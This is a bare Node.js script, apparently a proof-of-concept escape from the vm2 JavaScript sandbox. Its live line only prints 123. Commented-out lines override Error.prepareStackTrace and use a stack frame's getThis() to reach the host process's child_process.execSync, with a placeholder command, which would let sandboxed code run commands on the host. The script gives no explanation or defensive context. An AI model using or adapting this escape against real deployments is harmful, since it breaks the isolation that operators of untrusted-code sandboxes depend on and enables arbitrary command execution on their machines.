let vm = require("vm2");
let v = new vm.VM();

v.run(`
console.log(123);
// globalThis.OldError=globalThis.Error;
// try{
// const a=123
// a=44
// }catch(err){
//   console.log(err)  
// }

// globalThis.Error={}
// globalThis.Error.prepareStackTrace=(errStr,traces)=>{
//     traces[0].getThis().process.mainModule.require('child_process').execSync('YOUR ') 
// }  
// const {stack}=new globalThis.OldError   

`)
            
